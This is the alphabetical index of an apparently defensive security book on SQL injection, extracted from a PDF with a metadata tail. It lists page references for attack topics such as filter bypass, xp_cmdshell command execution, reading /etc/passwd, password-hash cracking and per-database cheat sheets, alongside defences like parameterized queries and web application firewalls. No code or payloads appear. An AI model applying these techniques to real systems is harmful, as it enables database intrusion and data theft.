bypassing custom filters, 347–348 case variation, 340 comments, 340–341 dynamic query execution, 342–345 non-standard entry points, 348–350 null bytes, 345 search query referers, 349 sql injection attacks, 340 stripped expressions, 345–346 truncation, 346–347 unicode encodings, 343 url encoding, 341–342 input validation .net, 386 blacklisting, 383–384 html5, 387 java defaultvalidator , 385 java server faces (jsf), 384–385 mobile apps , 387 php, 386–387 whitelisting binary blob, 380 luhn formula, 379 known value validation, 380–383 intercepting filters application filters j2ee filter class, 420–421 secure parameter filter (spf), 420–421 filtering web service messages, 422 scripting languages, filter pattern, 421–422 web server filters application program interface (api), 417–418 urlscan, 419 webknight, 419–420 internet information server (iis), 334 intrusion detection systems (idss), 345, 424–425 j java applications coding behavior recognition, 97–98 dangerous functions, 102 data process, 109–110 java database connectivity (jdbc), 102, 372 k keyword- blocking filter, 340 m mail transfer agents (mta), 273 microsoft access databases, 530–531 microsoft code analysis tool .net (cat.net), 131–132 microsoft sql server database o’boyle string, 391 preceding characters, 392–393 transact -sql code, 391 wildcard character, 392– 393 encoding output, database, 390–393 execution plan, database, 458–459 object timestamps, database, 469 operating system commands .net binary, 321 ipconfig command, 318–319 surface area configuration, 319 xp_cmdshell , 318–319 reading files .net binary, 301 activex control, 300–301 alter assembly command, 303 bulk insert method, 297 common language runtime (clr), 301–303 communication mechanism, 299 create assembly function, 302 domain name system (dns), 296–297 file system object, 300–301 net.exe, 299 ole automation, 300 query analyzer, 298 rdbms, 297 remote file servers, 299 scripting.filesystemobject, 300–301 security development lifecycle (sdl), 296–297 stolen -boot.ini, 299–300 sysadmin group, 304 union query, 297 transaction log, 463–465 writing files binary files, 310 bulk copy program (bcp), 311 csc.exe, 314–315 dos copy command, 311–312 dynamic link library (dll), 313–314 echo commands, 312 file compiling, 314–315 filesystemobject , 310 meterpreter, 313–314 remote database server, 312–315 sp_oacreate , 310 unix, 312–313 worms, 312 microsoft sql server cheat sheet blind sql injection functions, 504 database configuration information and schema, 500–504 database server attacking cracking database passwords, 507 file read/write, 508 server 2005 hashes, 507– 508 xp_cmdshell, 506–507 openrowset reaut hentication attack, 505–506 server privilege escalation, 504–506 mssql_execute( ) and odbc_prepare( ), 105–106 mysql administrative privileges, 178 database stored procedure code, 393–394 string terminator, 393–394 wildcards, 394 database schema enumeration, 178–183 delays in database queries, 250–252 e-mail system, 211–214 encoding output, database, 393–394 execution plan, database, 459–460 file system, 218–219 hierarchical approach, 178 into outfile, 218, 219 myd files, 183 mysql and information_schema, 178, 179 object timestamps, database, 470–471 operating system commands asp.net, 318 hackproofing, 318 wamp environments, 318 out-of-band communication, 211–214 output tables, 182 password hashes, 206 password( ) function, 206 reading files binary files, 295, 296 database, 292 debug message, 292 hackproofing, 295 hex( ) function, 295 load data infile command, 291 load_file function, 292, 295–296 ngs software, 295 queries, 294 remote file syste m, 295 substring function, 296 text file, 291–292 union statement, 292–294 universal naming convention (unc), 296 vulnerable intranet application, 293 response -based techniques, 259–260 transaction log, 466–468 writing files apache.org, 309 binary files, 308 built-in function, 308 dumpfile , 307–308 hackproofing, 310 load data infile command, 307 unhex( ) , 308 user-defined function (udf), 310 mysql cheat sheet blind sql injection functions, 508 database configuration information and schema, 508 database server attacking cracking database passwords, 510 database directly attacking, 510–511 file read, 511 file write, 511 system command execution, 509–510 o open web application security project (owasp), 405 operating system exploitation consolidating access, 333 –335 database programmers, 289 executing commands microsoft sql server, 318–322 mysq l, 318 oracle, 322–330 postgresql, 330–333 file system accessing reading files, 290–306 writing files, 306–317 oracle columns and data type, 185 components apex, 209 oracle internet directory (oid), 209–211 concept, 201 data encryption standard (des) password hashes, 207 database dbms_assert , 390 o’boyle, 389 preceding functions, 390 quote character, 390 database schema enumeration, 184–188 database server, 214 dba privileges, 201 delays in database queries, 257 e-mail system, 214–215 encoding output, database, 388–395 escalating privileges, 200 –202 execution plan, database, 459 file system, 219 mixed -case characters, 207 multiple databases, 184 object timestamps, database, 469–470 operating system commands alter system, 329 buffer overflow, 329 code execution via direct access, 325–330 custom application code, 329–330 dbms_scheduler, 326–327 extproc, 325–326 java, 326 pl/sql native, 327–328 pl/sql native 9i, 329 privilege escalation, 322–325 sysdba privileges, 330 text, 328–329 out-of-band communication, 214–215 password hashes, 207–211 pl/sql code, 200–201 privilege types, 185–186 reading files access files, 304 java, 304–306 select statements, 305 utl_ file_dir database, 304, 306 response -based techniques, 263–264 sys.dbms_cdc_publish, 202 sys.lt, 201–202 transaction log, 465–466 writing files binary code, 315 dbms_advisor , 315 java, 315–316 methods, 315 oracle cheat sheet blind sql injection functions, 511, 513 database configuration information and schema, 511, 513 database server attacking command execution, 513–514 cracking database passwords, 516–517 pl/sql reading local files, 514–515 pl/sql writing local files, 515–516 reading local files, 514 oracle pl/sql and microsoft transact -sql (t -sql) code authid clause, 118–119 built-in database, 118–119 data definition language (ddl) statements, 119–120 database administrators (dbas), 121 exec( ), 123 execute function, 121 –122 information_schema database, 126 like statement, 120 sp_helptext , 123 sql server 2008 database, 125 stored procedures, 123–125 user-controlled data, 121 p parameterized statement .net (c#) ado.net framework, 373–374 oledbclient, 375 html5 browser storage web sql database specification, 378 web storage specification, 379 java hibernate, 373 jdbc framework, 372 mobile apps android applications, 378 ios applications, 377–378 php data objects, 376 pdo package, 376–377 pl/sql, 377 pattern -matching filters, 340–341 payment card industry data security standards (pci -dss), 402–403 php applications $input variable, 108, 109 $sql variable, 107 awk function, 105 grep strings, 106 mssql_execute( ) and odbc_prepare( ), 105–106 user-controlled data, 108, 109 platform -level defenses application intrusion detection systems (idss), 424–425 aspect -oriented programming (aop), 424 database firewall, 425 intercepting filters application filters, 420–421 filter pattern, scripted languages, 421–422 filtering web service messages, 422 web server and application filters, 417–420 non-editable versus editable input protection, 422 runtime protection technologies and techniques code changes, 410 commercial off -the-shelf (cots) applications, 410 url/page -level strategies http handler configuration, 423 page overriding, 423 resource p roxying/wrapping, 424 substitute servlet configuration, 423 url rewriting, 423–424 web application f irewall (waf), 411–417 generic attacks rule file, 413 modsecurity, 411–417 secrule, generic syntax, 411–412 postgresql administrative privileges, 206 database pq_escape_string( ), 394 string terminator, 394 database schema enumeration, 183–184 delays in database queries, 252–254 encoding output, database, 394–395 execution plan, database, 460–461 hierarchical approach, 183 ilike clause, 184 md5, 207 object timestamps, database, 471–472 operating system commands, 330–333 password hashes, 206–207 reading files copy function, 306 ‘/etc/passwd’ file, 306 response -based techniques, 260–261 transaction log, 468 writing files copy function, 316 php programing language, 316 sqlmap suppor ts, 317 super user privileges, 316 postgresql cheat sheet blind sql injection functions, 518 database configuration information and schema, 517–518 database server attacking cracking database passwords, 519–520 local file access, 519 system command execution, 519 r relational database management system (rdbms), 297 response -based techniques mysql false inference, 259 true inference, 259 web application, 259 one bit information binary search method, 266–267 case statement, 265–266 oracle cast( ), 264 key bits, 263 postgres ql error management, 261 pause( ) function, 261 sql server asp.net, 262–263 case statement, 263 reviewing source code $param, 90–91 android application code content -providers, 111–112, 115, 116 sqlitedatabase, 112–114 sqlitequerybuilder, 112–114 sqlmap, 112–114 webcontentresolver, 112 automated tools abstract syntax tree (ast), 127 appcodescan, 130 appscan source edition, 135 codepro analytix, 132 codesecure, 135 command -line utilities, 126–127 control flow graph (cfg), 127 klocwor k solo, 135–136 lexical analysis, 127 microsoft analyzer, 131 microsoft code analysis tool .net (cat.net), 131–132 mysql_query( ) function, 127 owasp lapse+ project, 130–131 php scripts, vulnerabilities in, 132 pixy, 129–130 rips, 132 source code analyzers (scas), 133–134 static analysis, 134–135 teachable static analysis workbench (tesa), 132–133 yet another source code analyzer (yasca), 129 coding behavior recognition build and execute statements, 92–93 c# applications, 98–99 dynamic string -building techniques, 92 execute function, 93, 94 html form, 95 http headers, 95 java application, 97–98 method attribute, 95 oracle stored procedures, 94 php function and code, 96 string concatenation, 92 user-controlled input, 94 –95 dangerous functions c#, 103–104 java application, 102 java.sql, 102 php scripting language, 99–102 vulnerable applications, 99 data process c#, 110–111 grep tool, 104 integrated develop ment environment (ide), 104 java, 109–110 php, 104–111 dynami c code analysis, 89–90 methodical approach, 90 methods, 89–90 php code, 90–91 pl/sql and t -sql code authid clause, 118–119 built-in database, 118–119 data definition language (ddl) statements, 119–120 database administrators (dbas), 121 exec( ), 123 execute function, 121 –122 information_schema database, 126 like statement, 120 sp_helptext , 123 sql server 2008 database, 125 stored procedures, 123–125 user-controlled data, 121 security -sensitive function, 90 sinks, 92 static code analysis, 89–90 user-controlled data, 91 role privileges, 185–187 s sanitizing filters, 345, 346 sap max db (sap db), 15 second -order sql injection address book application, 350–352 bugs, 354 http request and response, 350 second -order vulnerabilities, 352–355 secure sockets layer (ssl), 437 simple mail transfer protocol (smtp), 273 simple object access protocol (soap), 334–335 sql injection flaws, 12 sql injection vulnerabilities cms application, 7–8 dynamic string buildin g built-in command, 16 error handling, 18–19 escape characters handling, 14–15 handling types, 15–17 idiosyncrasies of, 15 multiple submissions handling, 19–21 parameterized queries, 13 –14 php code, 14 query assembly handling, 17–18 string -building techniques, 13–14 e-commerce application, 2, 6 get versus post parameters, 7 high-profile web sites common vulnerabilities and exposures (cve), 9 –10 hacking web applications, 11–12 malicious script, 12 script kiddies, 12 http -delivered enterprise ap plications, 6 insecure database configuration built-in stored procedures, 21 commands, 22 database administrator (dba) privileges, 22–23 database metadata, 22 oracle, 22–23 system privileges, 21 login.php script, 8 mysql database, 23 parsing and execution, 6 programming languages, 13 web applications works database -driven, 2 four-tier architecture, 5–6 php script, 3 three- tier architecture, 4–5 sql server brute -force mode, 197 columns, 176 database schema enumeration, 175–178 database table extraction, 218 delays in database queries, 254–257 e-commerce application, 175 e-shop database, 176 escalating privileges, 194 –200 file system –u and–p parameters, 218 bcp.exe, 217 password hash, 216–217 queryout parameter, 217 sql_logins table, 216 fn_varbintohexstr( ) , 205 openrowset command, 194–195 out-of-band communication, 216–218 password hashes, 204–206 pwdencrypt( ) , 204 remote database server, 175 response -based techniques, 261–263 server file system, 216 sp_addsrvrolemember procedure, 195 sysxlogins table, 205 union select , 177 unpatched servers, 199–200 waitfor delay, 197 sqlmap command -line automation, 224 par excellence, 224 python, 224–225 squeeza, 284–286 ssl. see secure sockets layer (ssl) structured query language (sql) primer bypassing input validation filters http encoding, 521, 522 quote filters, 520–521 db2 cheat sheet blind sql injection functions, 526, 527 database configuration information and schema, 526 informix cheat sheet blind sql injection functions, 527–528 database configuration information and schema, 527 ingres cheat sheet blind sql injection functions, 528–529 database configuration information and schema, 528, 529 injection combine multiple rows and columns, 499 database platform identification, 495–497 vulnerabilities, 492–495 materials resources cheat sheets, 531 exploit tools, 531–532 password cracking tools, 532 white papers, 531 microsoft sql server cheat sheet blind sql injection functions, 504 database configuration information and schema, 500–504 database server attacking, 506–508 microsoft sql server privilege escalation, 504–506 openrowset reauthentication attack, 505–506 mysql cheat sheet blind sql injection functions, 508 database configuration information and schema, 508 database server attacking, 508–511 oracle cheat sheet blind sql injection functions, 511, 513 database configuration information and schema, 511, 513 database server attacking, 511–517 postgresql cheat sheet blind sql injection functions, 518 database configuration information and schema, 517, 518 database server attacking, 518–520 sql queries alter table statement, 490 create table statement, 488–490 delete statement, 488 drop statement, 488 group by statement, 490 insert statement, 487– 488 order by clause, 490 –491 result set limitation, 491– 492 select statement, 486 –487 union operator, 487 update statement, 488 sybase cheat sheet blind sql injection functions, 530 database configuration information and schema, 529, 530 troubleshooting sql injection attacks, 521–525 substring( ) function, 242–243 sybase cheat sheet blind sql injection functions, 530 database configuration information and schema, 529, 530 system privileges, 185 –187 t table privileges, 185– 187 tcp. see transmission control protocol (tcp) testing and inference application response back -end database, 49 different inputs, 53–54 generic errors, 49–52 http code errors, 52–53 automating discovery database error, 76 get and post requests, 76 hp scrawlr, 80–82 hp webinspect, 77–79 ibm rational appscan, 79–80 paros proxy, 83–85 sqlix, 82–83 tasks, 76 zed attack proxy, 83–85 blind injection detection, 54–58 confirming and terminating back -end server, 70 benchmark function, 75 database comment syntax, 65–67 database concatenation operators, 69, 70 dbms_lock.sleep( ) functi on, 76 executing multiple statement, 70–74 exploitation, 68 inline function, 59–65 multiline comments, 68, 69 numbers and strings, 58– 59 statement, 65 testing string, 70 time delays, 74–76 trial- and-error process, 58 victim inc, 67 database errors microsoft sql server, 38 –42 mysql, 42–45 oracle, 45–47 postgresql, 47–49 triggers, 37 get requests, 29 information workflow, 35 injectable data, 31–32 manipulating parameters, 32–35 post requests, 29–31 trigger anomalies, 28 three- tier architecture, 4–5 tiered architecture, basic concept of, 5–6 time-based techniques database queries methods, 249 mysql delays, 250–252 oracle delays, 257 postgresql delays, 252– 254 sql server delays, 254– 257 inference considerations, 257–258 transaction log analysis, 463–468 microsoft sql server, 463–465 mysql, 466–468 oracle, 465–466 postgresql, 468 transmission control protocol (tcp), 267, 296–297 troubleshooting sql injection attacks, 521–525 u union statements data types back -end database, 156 brute -force guessing, 153–154 cast operators, 156 integer and string, 154 looping statement, 158 multiple data, 155 null clause, 153 select queries, 156 system_user and db_name( ), 155 where clause, 157 matching columns database server technology, 151 order by clause, 152 –153 products.asp, 152 requirements, 151 syntax, 150–151 universal naming convention (unc), 296 user datagram protocol (udp), 312 user-defined function (udf), 310, 330 userid , 8 v virtual private database (vpd), 404 w web application firewalls (waf), 339–340 http/https, 411 modsecurity configura ble rule set, 411 –414 generic attacks rule file, 413 intrusion detection capabilities, 416–417 request normalization, 415–416 request variables and coverage, 414–415 response analysis, 416 secrule, generic syntax, 411–412 sql errors leakage rule, 416 transformation functions, 415 whitelist rule, 414 web applications content management system (cms), 8 cve requests, 9–10 database -driven, 2 e-commerce application, 2 four-tier architecture, 5–6 hybrid attacks creating cross -site scripting (xss), 358–359 exploiting authenticated vulnerabilities, 360–361 leveraging captured data, 358 operating system commands, oracle, 359–360 input filters bypassing custom filters, 347–348 case variation, 340 comments, 340–341 dynamic query execution, 342–345 non-standard entry points, 348–350 null bytes, 345 search query referers, 349 sql injection attacks, 340 stripped expressions, 345–346 truncation, 346–347 unicode encodings, 343 url encoding, 341–342 owasp lists injection, 9 –10 php script, 3 programming languages, 13 rdbms, 19 three- tier architecture, 3–5 web environment, 27–28 web in frastructure configuration, 439–440 web server and application filters, 417–420 web services description language (wsdl), 438 x xss. see cross -site scripting (xss) z zone -h, 10",
  "metadata": {
    "filename": "05. SQL Injection Attacks and Defense.pdf",
    "filepath": "C:\\Users\\Albert\\aa-660-ai-doc-classification-deduplication\\data\\raw\\05. SQL Injection Attacks and Defense.pdf",
    "hash": "781dba79b049c6387762dba84ba446d56e6edda941bff34566d4c55813631a9d",
    "filesize": 6732741,
    "language": "en"
  }
}